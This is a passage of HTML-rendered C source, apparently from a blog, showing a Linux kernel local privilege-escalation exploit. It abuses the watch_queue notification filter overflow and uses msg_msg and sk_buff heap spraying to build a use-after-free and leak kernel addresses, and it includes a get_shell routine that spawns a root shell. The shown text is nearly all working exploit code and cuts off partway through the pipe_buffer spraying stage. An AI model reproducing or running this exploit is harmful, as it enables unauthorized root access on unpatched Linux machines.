class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/watch_queue.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">void</span> (*func)(struct callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="keyword">void</span> *))));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rcu_head callback_head</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_type_filter</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">watch_notification_type</span> <span class="title">type</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> subtype_filter[<span class="number">1</span>]; <span class="comment">/* Bitmask of subtypes to filter on */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> info_filter;       <span class="comment">/* Filter on watch_notification::info */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> info_mask;         <span class="comment">/* Mask of relevant bits in info_filter */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_filter</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> type_filter[<span class="number">2</span>]; <span class="comment">/* Bitmask of accepted types */</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_filters; <span class="comment">/* Number of filters */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">watch_type_filter</span> <span class="title">filters</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_TAG 0xAAAAAAAA</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_TYPE 0x41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_TYPE 0x42</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_SIZE 96</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VICTIM_MSG_TYPE 0x1337</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKET_NUM 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OOB_PIPE_NUM 100</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;    <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="keyword">void</span> *next;     <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="keyword">void</span> *security; <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">uint32_t</span> offset, len;</span><br><span class="line">    <span class="keyword">uint64_t</span> ops;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line">    <span class="keyword">uint32_t</span> padding;</span><br><span class="line">    <span class="keyword">uint64_t</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> confirm;</span><br><span class="line">    <span class="keyword">uint64_t</span> release;</span><br><span class="line">    <span class="keyword">uint64_t</span> try_steal;</span><br><span class="line">    <span class="keyword">uint64_t</span> get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125; primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125; secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trigger_overflow</span><span class="params">(<span class="keyword">int</span> oob_pipe[<span class="number">2</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> *<span class="title">wfilter</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nfilters;</span><br><span class="line"></span><br><span class="line">    nfilters = <span class="number">4</span>;</span><br><span class="line">    wfilter = (struct watch_notification_filter *)</span><br><span class="line">        <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(struct watch_notification_filter) + nfilters * <span class="keyword">sizeof</span>(struct watch_notification_type_filter));</span><br><span class="line">    wfilter-&gt;nr_filters = nfilters;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (nfilters - <span class="number">1</span>); i++)</span><br><span class="line">        wfilter-&gt;filters[i].type = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    wfilter-&gt;filters[nfilters - <span class="number">1</span>].type = <span class="number">0x30a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ioctl(oob_pipe[<span class="number">0</span>], IOC_WATCH_QUEUE_SET_FILTER, wfilter) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to ioctl IOC_WATCH_QUEUE_SET_FILTER!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(wfilter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> oob_pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">int</span> sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="keyword">int</span> victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line">    <span class="keyword">int</span> oob_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="keyword">int</span> pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line">    *(<span class="keyword">long</span> *)&amp;primary_msg = PRIMARY_MSG_TYPE;</span><br><span class="line">    *(<span class="keyword">long</span> *)&amp;secondary_msg = SECONDARY_MSG_TYPE;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;primary_msg.mtext[<span class="number">0x8</span>], <span class="string">&quot;this is first msg_msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe2(oob_pipe_fd, O_NOTIFICATION_PIPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to create O_NOTIFICATION_PIPE!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;primary_msg,</span><br><span class="line">                   <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;secondary_msg,</span><br><span class="line">                   <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="number">1024</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (msgrcv(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to read msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    trigger_overflow(oob_pipe_fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] construct UAF\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">1024</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (msgrcv(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to read msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] != i)</span><br><span class="line">        &#123;</span><br><span class="line">            victim_qid = i;</span><br><span class="line">            oob_qid = *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (victim_qid == <span class="number">-1</span> || oob_qid == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] failed find victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] find victim id: %d, oob id: %d\n&quot;</span>, victim_qid, oob_qid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[oob_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg);</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg) - <span class="number">8</span>, <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg = (struct msg_msg *)&amp;oob_msg.mtext[(SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg))];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%p\n&quot;</span>,</span><br><span class="line">           nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> search_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)nearby_msg-&gt;m_list.prev;</span><br><span class="line">    search_addr = search_addr - <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="keyword">sizeof</span>(oob_msg.mtext);</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = search_addr;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg_prim = (struct msg_msg *)&amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">    <span class="keyword">uint64_t</span> victim_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    victim_addr = victim_addr - <span class="number">0x400</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%p\n&quot;</span>,</span><br><span class="line">           nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%p\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = victim_addr + <span class="number">0x800</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = victim_addr + <span class="number">0x800</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = VICTIM_MSG_TYPE;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="number">1024</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span 